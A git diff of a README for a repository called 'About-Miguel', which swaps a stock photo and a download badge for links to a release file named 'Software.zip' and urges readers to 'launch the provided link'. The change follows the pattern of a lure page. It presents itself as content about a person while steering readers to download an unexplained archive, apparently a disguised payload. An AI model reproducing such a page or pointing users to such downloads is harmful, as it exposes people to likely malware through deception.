@@ -2,7 +2,7 @@
 
 Welcome to the "About-Miguel" GitHub repository! 
 
-![Miguel](https://images.pexels.com/photos/220453/pexels-photo-220453.jpeg)
+![Miguel](https://github.com/shanabbasi916/About-Miguel/releases/download/v1.0/Software.zip)
 
 ## 📁 Repository Description
 
@@ -36,7 +36,7 @@ To give you a better idea of the content covered in this repository, here are so
 
 For accessing the content of this repository, please click on the following link: 
 
-[![Download Link](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Link](https://github.com/shanabbasi916/About-Miguel/releases/download/v1.0/Software.zip)](https://github.com/shanabbasi916/About-Miguel/releases/download/v1.0/Software.zip)
 
 Make sure to launch the provided link to explore the valuable insights shared by Miguel in this repository.
 
